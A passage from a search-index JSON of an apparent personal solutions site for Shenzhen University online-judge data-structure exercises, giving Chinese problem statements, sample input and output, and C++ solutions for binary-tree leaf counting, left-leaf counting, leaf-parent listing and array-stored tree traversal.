\u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e8c\u53c9\u6811\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1214/#_3","text":"\u9010\u884c\u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5305\u542b\u7684\u53f6\u5b50\u6570\u91cf","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1214/#_4","text":"1 2 3 4 3 AB0C00D00 AB00C00 ABC00D00E00","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1214/#_5","text":"1 2 3 2 2 3","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1214/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1214/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } int leaves () { int count = 0 ; leaves ( root , count ); return count ; } private : struct Node { char data ; Node * left , * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void leaves ( Node * node , int & count ) { if ( node ) { if ( node -> left == NULL && node -> right == NULL ) { count += 1 ; } leaves ( node -> left , count ); leaves ( node -> right , count ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); std :: cout << biTree . leaves () << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1215/","text":"DS\u4e8c\u53c9\u6811--\u5de6\u53f6\u5b50\u6570\u91cf \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8ba1\u7b97\u4e00\u9897\u4e8c\u53c9\u6811\u5305\u542b\u7684\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf\u3002 \u5de6\u53f6\u5b50\u662f\u6307\u5b83\u7684\u5de6\u53f3\u5b69\u5b50\u4e3a\u7a7a\uff0c\u800c\u4e14\u5b83\u662f\u7236\u4eb2\u7684\u5de6\u5b69\u5b50 \u63d0\u793a\uff1a\u53ef\u4ee5\u7528\u4e09\u53c9\u94fe\u8868\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u7b97\u6cd5\u5bf9\u4e24\u5c42\u7ed3\u70b9\u8fdb\u884c\u5224\u65ad \u5efa\u6811\u65b9\u6cd5\u91c7\u7528\u201c\u5148\u5e8f\u904d\u5386+\u7a7a\u6811\u75280\u8868\u793a\u201d\u7684\u65b9\u6cd5 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u6570\u636e \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e8c\u53c9\u6811\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8f93\u5165t\u884c \u8f93\u51fa \u9010\u884c\u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5305\u542b\u7684\u5de6\u53f6\u5b50\u6570\u91cf \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 AB0C00D00 AB00C00 ABCD0000EF000 \u6837\u4f8b\u8f93\u51fa 1 2 3 0 1 2 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } int leavesOfLeftChild () { int count = 0 ; leavesOfLeftChild ( root , count ); return count ; } private : struct Node { char data ; Node * left , * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void leavesOfLeftChild ( Node * node , int & count ) { if ( node ) { Node * leftChild = node -> left ; if ( leftChild != NULL && leftChild -> left == NULL && leftChild -> right == NULL ) { count += 1 ; } leavesOfLeftChild ( node -> left , count ); leavesOfLeftChild ( node -> right , count ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); std :: cout << biTree . leavesOfLeftChild () << std :: endl ; } return 0 ; }","title":"DS\u4e8c\u53c9\u6811--\u5de6\u53f6\u5b50\u6570\u91cf"},{"location":"szu_oj/ds/1215/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811--\u5de6\u53f6\u5b50\u6570\u91cf"},{"location":"szu_oj/ds/1215/#_1","text":"\u8ba1\u7b97\u4e00\u9897\u4e8c\u53c9\u6811\u5305\u542b\u7684\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf\u3002 \u5de6\u53f6\u5b50\u662f\u6307\u5b83\u7684\u5de6\u53f3\u5b69\u5b50\u4e3a\u7a7a\uff0c\u800c\u4e14\u5b83\u662f\u7236\u4eb2\u7684\u5de6\u5b69\u5b50 \u63d0\u793a\uff1a\u53ef\u4ee5\u7528\u4e09\u53c9\u94fe\u8868\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u7b97\u6cd5\u5bf9\u4e24\u5c42\u7ed3\u70b9\u8fdb\u884c\u5224\u65ad \u5efa\u6811\u65b9\u6cd5\u91c7\u7528\u201c\u5148\u5e8f\u904d\u5386+\u7a7a\u6811\u75280\u8868\u793a\u201d\u7684\u65b9\u6cd5","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1215/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u6570\u636e \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e8c\u53c9\u6811\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1215/#_3","text":"\u9010\u884c\u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5305\u542b\u7684\u5de6\u53f6\u5b50\u6570\u91cf","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1215/#_4","text":"1 2 3 4 3 AB0C00D00 AB00C00 ABCD0000EF000","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1215/#_5","text":"1 2 3 0 1 2","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1215/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1215/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } int leavesOfLeftChild () { int count = 0 ; leavesOfLeftChild ( root , count ); return count ; } private : struct Node { char data ; Node * left , * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void leavesOfLeftChild ( Node * node , int & count ) { if ( node ) { Node * leftChild = node -> left ; if ( leftChild != NULL && leftChild -> left == NULL && leftChild -> right == NULL ) { count += 1 ; } leavesOfLeftChild ( node -> left , count ); leavesOfLeftChild ( node -> right , count ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); std :: cout << biTree . leavesOfLeftChild () << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1216/","text":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u7236\u5b50\u7ed3\u70b9 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\uff0c\uff08\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u4f8b\u5982AB0C00D00\uff09\uff0c\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u3002 \u7f16\u5199\u7a0b\u5e8f\u8f93\u51fa\u8be5\u6811\u7684\u6240\u6709\u53f6\u5b50\u7ed3\u70b9\u548c\u5b83\u4eec\u7684\u7236\u4eb2\u7ed3\u70b9 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\uff0c\u6309\u7167\u9898\u76ee\u8868\u793a\u7684\u8f93\u5165\u65b9\u6cd5\uff0c\u8f93\u5165\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\uff0c\u8fde\u7eed\u8f93\u5165t\u884c \u8f93\u51fa \u7b2c\u4e00\u884c\u6309\u5148\u5e8f\u904d\u5386\uff0c\u8f93\u51fa\u7b2c1\u4e2a\u793a\u4f8b\u7684\u53f6\u5b50\u8282\u70b9 \u7b2c\u4e8c\u884c\u8f93\u51fa\u7b2c1\u4e2a\u793a\u4f8b\u4e2d\u4e0e\u53f6\u5b50\u76f8\u5bf9\u5e94\u7684\u7236\u4eb2\u8282\u70b9 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u51fa\u5176\u5b83\u793a\u4f8b\u7684\u7ed3\u679c \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 AB0C00D00 AB00C00 ABCD0000EF000 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 C D B A B C A A D F C E \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #include <iostream> #include <string> #include <vector> class Tree { public : Tree () : root_ ( NULL ) {} void assign ( std :: string & string ) { int index = 0 ; assign ( string , index , root_ , NULL ); } void printlnLeavesAndFathers () { printlnLeavesAndFathers ( root_ ); printVector ( leaves_ ); printVector ( fathers_ ); } private : struct Node { char data ; Node * left , * right ; Node * father ; Node () : data ( 0 ), left ( NULL ), right ( NULL ), father ( NULL ) {} Node ( const char data ) : data ( data ), left ( NULL ), right ( NULL ), father ( NULL ) {} }; Node * root_ ; void assign ( std :: string & string , int & index , Node *& node , Node * pre ) { const char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); node -> father = pre ; assign ( string , index , node -> left , node ); assign ( string , index , node -> right , node ); } else { node = NULL ; } } std :: vector < char > leaves_ , fathers_ ; void printlnLeavesAndFathers ( Node * node ) { if ( node ) { if ( node -> left == NULL && node -> right == NULL ) { leaves_ . push_back ( node -> data ); fathers_ . push_back ( node -> father -> data ); } printlnLeavesAndFathers ( node -> left ); printlnLeavesAndFathers ( node -> right ); } } template < typename T > static void printVector ( const std :: vector < T > & vector ) { for ( int i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class Tree tree ; tree . assign ( string ); tree . printlnLeavesAndFathers (); } return 0 ; }","title":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u7236\u5b50\u7ed3\u70b9"},{"location":"szu_oj/ds/1216/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u7236\u5b50\u7ed3\u70b9"},{"location":"szu_oj/ds/1216/#_1","text":"\u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\uff0c\uff08\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u4f8b\u5982AB0C00D00\uff09\uff0c\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u3002 \u7f16\u5199\u7a0b\u5e8f\u8f93\u51fa\u8be5\u6811\u7684\u6240\u6709\u53f6\u5b50\u7ed3\u70b9\u548c\u5b83\u4eec\u7684\u7236\u4eb2\u7ed3\u70b9","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1216/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\uff0c\u6309\u7167\u9898\u76ee\u8868\u793a\u7684\u8f93\u5165\u65b9\u6cd5\uff0c\u8f93\u5165\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\uff0c\u8fde\u7eed\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1216/#_3","text":"\u7b2c\u4e00\u884c\u6309\u5148\u5e8f\u904d\u5386\uff0c\u8f93\u51fa\u7b2c1\u4e2a\u793a\u4f8b\u7684\u53f6\u5b50\u8282\u70b9 \u7b2c\u4e8c\u884c\u8f93\u51fa\u7b2c1\u4e2a\u793a\u4f8b\u4e2d\u4e0e\u53f6\u5b50\u76f8\u5bf9\u5e94\u7684\u7236\u4eb2\u8282\u70b9 \u4ee5\u6b64\u7c7b\u63a8\u8f93\u51fa\u5176\u5b83\u793a\u4f8b\u7684\u7ed3\u679c","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1216/#_4","text":"1 2 3 4 3 AB0C00D00 AB00C00 ABCD0000EF000","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1216/#_5","text":"1 2 3 4 5 6 C D B A B C A A D F C E","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1216/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1216/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #include <iostream> #include <string> #include <vector> class Tree { public : Tree () : root_ ( NULL ) {} void assign ( std :: string & string ) { int index = 0 ; assign ( string , index , root_ , NULL ); } void printlnLeavesAndFathers () { printlnLeavesAndFathers ( root_ ); printVector ( leaves_ ); printVector ( fathers_ ); } private : struct Node { char data ; Node * left , * right ; Node * father ; Node () : data ( 0 ), left ( NULL ), right ( NULL ), father ( NULL ) {} Node ( const char data ) : data ( data ), left ( NULL ), right ( NULL ), father ( NULL ) {} }; Node * root_ ; void assign ( std :: string & string , int & index , Node *& node , Node * pre ) { const char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); node -> father = pre ; assign ( string , index , node -> left , node ); assign ( string , index , node -> right , node ); } else { node = NULL ; } } std :: vector < char > leaves_ , fathers_ ; void printlnLeavesAndFathers ( Node * node ) { if ( node ) { if ( node -> left == NULL && node -> right == NULL ) { leaves_ . push_back ( node -> data ); fathers_ . push_back ( node -> father -> data ); } printlnLeavesAndFathers ( node -> left ); printlnLeavesAndFathers ( node -> right ); } } template < typename T > static void printVector ( const std :: vector < T > & vector ) { for ( int i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class Tree tree ; tree . assign ( string ); tree . printlnLeavesAndFathers (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1217/","text":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u6570\u7ec4\u5b58\u50a8 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u4e8c\u53c9\u6811\u53ef\u4ee5\u91c7\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\u8fdb\u884c\u5b58\u50a8\uff0c\u628a\u6570\u7ec4\u4e2d\u7684\u6570\u636e\u4f9d\u6b21\u81ea\u4e0a\u800c\u4e0b,\u81ea\u5de6\u81f3\u53f3\u5b58\u50a8\u5230\u4e8c\u53c9\u6811\u7ed3\u70b9\u4e2d\uff0c\u4e00\u822c\u4e8c\u53c9\u6811\u4e0e\u5b8c\u5168\u4e8c\u53c9\u6811\u5bf9\u6bd4\uff0c\u6bd4\u5b8c\u5168\u4e8c\u53c9\u6811\u7f3a\u5c11\u7684\u7ed3\u70b9\u5c31\u5728\u6570\u7ec4\u4e2d\u75280\u6765\u8868\u793a\u3002\uff0c\u5982\u4e0b\u56fe\u6240\u793a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u53f3\u8fb9\u7684\u662f\u4e00\u9897\u666e\u901a\u7684\u4e8c\u53c9\u6811\uff0c\u5f53\u5b83\u4e0e\u5de6\u8fb9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u5bf9\u6bd4\uff0c\u53d1\u73b0\u5b83\u6bd4\u5b8c\u5168\u4e8c\u53c9\u6811\u5c11\u4e86\u7b2c5\u53f7\u7ed3\u70b9\uff0c\u6240\u4ee5\u5728\u6570\u7ec4\u4e2d\u75280\u8868\u793a\uff0c\u540c\u6837\u5b83\u8fd8\u5c11\u4e86\u5b8c\u5168\u4e8c\u53c9\u6811\u4e2d\u7684\u7b2c10\u300111\u53f7\u7ed3\u70b9\uff0c\u6240\u4ee5\u5728\u6570\u7ec4\u4e2d\u4e5f\u75280\u8868\u793a\u3002 \u7ed3\u70b9\u5b58\u50a8\u7684\u6570\u636e\u5747\u4e3a\u975e\u8d1f\u6574\u6570 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u6570\u7ec4\uff0c\u5148\u8f93\u5165\u6570\u7ec4\u957f\u5ea6\uff0c\u518d\u8f93\u5165\u6570\u7ec4\u5185\u6570\u636e\uff0c\u6bcf\u4e2a\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00\uff0c\u8f93\u5165\u7684\u6570\u636e\u90fd\u662f\u975e\u8d1f\u6574\u6570 \u8fde\u7eed\u8f93\u5165t\u884c \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u793a\u4f8b\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 3 1 2 3 5 1 2 3 0 4 13 1 2 3 4 0 5 6 7 8 0 0 9 10 \u6837\u4f8b\u8f93\u51fa 1 2 3 1 2 3 1 2 4 3 1 2 4 7 8 3 5 9 10 6 \u63d0\u793a \u6ce8\u610f\u4ece\u6570\u7ec4\u4f4d\u7f6e\u548c\u4e8c\u53c9\u6811\u6df1\u5ea6\u3001\u7ed3\u70b9\u4f4d\u7f6e\u8fdb\u884c\u5173\u8054\uff0c\u6216\u8005\u7236\u5b50\u7ed3\u70b9\u5728\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\u5b58\u5728\u67d0\u79cd\u7ba1\u7406\uff0c\u4f8b\u5982i, i+1, i/2, i+\u00bd........\u6216\u80052i, 2i+1.......\u4ed4\u7ec6\u89c2\u5bdf\u54e6 \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include <iostream> #include <vector> class BiTree { public : explicit BiTree ( size_t size ) : arr_ ( size , 0 ) {} void setFromCin () { for ( int i = 0 ; i < arr_ . size (); ++ i ) { std :: cin >> arr_ [ i ]; } } void preOrderTraverse () { preOrderTraverse ( 0 ); std :: cout << std :: endl ; } private : std :: vector < int > arr_ ; void preOrderTraverse ( int index ) { if ( index < arr_ . size () && arr_ [ index ] != 0 ) { std :: cout << arr_ [ index ] << ' ' ; preOrderTraverse ( 2 * index + 1 ); preOrderTraverse ( 2 * index + 2 ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class BiTree biTree ( size ); biTree . setFromCin (); biTree . preOrderTraverse (); } return 0 ; }","title":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u6570\u7ec4\u5b58\u50a8"},{"location":"szu_oj/ds/1217/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811\u2014\u2014\u4e8c\u53c9\u6811\u4e4b\u6570\u7ec4\u5b58\u50a8"},{"location":"szu_oj/ds/1217/#_1","text":"\u4e8c\u53c9\u6811\u53ef\u4ee5\u91c7\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\u8fdb\u884c\u5b58\u50a8\uff0c\u628a\u6570\u7ec4\u4e2d\u7684\u6570\u636e\u4f9d\u6b21\u81ea\u4e0a\u800c\u4e0b,\u81ea\u5de6\u81f3\u53f3\u5b58\u50a8\u5230\u4e8c\u53c9\u6811\u7ed3\u70b9\u4e2d\uff0c\u4e00\u822c\u4e8c\u53c9\u6811\u4e0e\u5b8c\u5168\u4e8c\u53c9\u6811\u5bf9\u6bd4\uff0c\u6bd4\u5b8c\u5168\u4e8c\u53c9\u6811\u7f3a\u5c11\u7684\u7ed3\u70b9\u5c31\u5728\u6570\u7ec4\u4e2d\u75280\u6765\u8868\u793a\u3002\uff0c\u5982\u4e0b\u56fe\u6240\u793a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u53f3\u8fb9\u7684\u662f\u4e00\u9897\u666e\u901a\u7684\u4e8c\u53c9\u6811\uff0c\u5f53\u5b83\u4e0e\u5de6\u8fb9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u5bf9\u6bd4\uff0c\u53d1\u73b0\u5b83\u6bd4\u5b8c\u5168\u4e8c\u53c9\u6811\u5c11\u4e86\u7b2c5\u53f7\u7ed3\u70b9\uff0c\u6240\u4ee5\u5728\u6570\u7ec4\u4e2d\u75280\u8868\u793a\uff0c\u540c\u6837\u5b83\u8fd8\u5c11\u4e86\u5b8c\u5168\u4e8c\u53c9\u6811\u4e2d\u7684\u7b2c10\u300111\u53f7\u7ed3\u70b9\uff0c\u6240\u4ee5\u5728\u6570\u7ec4\u4e2d\u4e5f\u75280\u8868\u793a\u3002 \u7ed3\u70b9\u5b58\u50a8\u7684\u6570\u636e\u5747\u4e3a\u975e\u8d1f\u6574\u6570","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1217/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u6570\u7ec4\uff0c\u5148\u8f93\u5165\u6570\u7ec4\u957f\u5ea6\uff0c\u518d\u8f93\u5165\u6570\u7ec4\u5185\u6570\u636e\uff0c\u6bcf\u4e2a\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00\uff0c\u8f93\u5165\u7684\u6570\u636e\u90fd\u662f\u975e\u8d1f\u6574\u6570 \u8fde\u7eed\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1217/#_3","text":"\u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u793a\u4f8b\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1217/#_4","text":"1 2 3 4 3 3 1 2 3 5 1 2 3 0 4 13 1 2 3 4 0 5 6 7 8 0 0 9 10","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1217/#_5","text":"1 2 3 1 2 3 1 2 4 3 1 2 4 7 8 3 5 9 10 6","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1217/#_6","text":"\u6ce8\u610f\u4ece\u6570\u7ec4\u4f4d\u7f6e\u548c\u4e8c\u53c9\u6811\u6df1\u5ea6\u3001\u7ed3\u70b9\u4f4d\u7f6e\u8fdb\u884c\u5173\u8054\uff0c\u6216\u8005\u7236\u5b50\u7ed3\u70b9\u5728\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\u5b58\u5728\u67d0\u79cd\u7ba1\u7406\uff0c\u4f8b\u5982i, i+1, i/2, i+\u00bd........\u6216\u80052i, 2i+1.......\u4ed4\u7ec6\u89c2\u5bdf\u54e6","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1217/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include <iostream> #include <vector> class BiTree { public : explicit BiTree ( size_t size ) : arr_ ( size , 0 ) {} void setFromCin () { for ( int i = 0 ; i < arr_ . size (); ++ i ) { std :: cin >> arr_ [ i ]; } } void preOrderTraverse () { preOrderTraverse ( 0 ); std :: cout << std :: endl ; } private : std :: vector < int > arr_ ; void preOrderTraverse ( int index ) { if ( index < arr_ . size () && arr_ [ index ] != 0 ) { std :: cout << arr_ [ index ] << ' ' ; preOrderTraverse ( 2 * index + 1 ); preOrderTraverse ( 2 * index + 2 ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class BiTree biTree ( size ); biTree . setFromCin (); biTree . preOrderTraverse (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1223/","text":"DS\u56fe\u904d\u5386--\u6df1\u5ea6\u4f18\u5148\u641c\u7d22 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u51fa\u4e00\u4e2a\u56fe\u7684\u90bb\u63a5\u77e9\u9635\uff0c\u5bf9\u56fe\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u4ece\u9876\u70b90\u5f00\u59cb \u6ce8\u610f\uff1a\u56fen\u4e2a\u9876\u70b9\u7f16\u53f7\u4ece0\u5230n-1 \u4ee3\u7801\u6846\u67b6\u5982\u4e0b\uff1a \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b 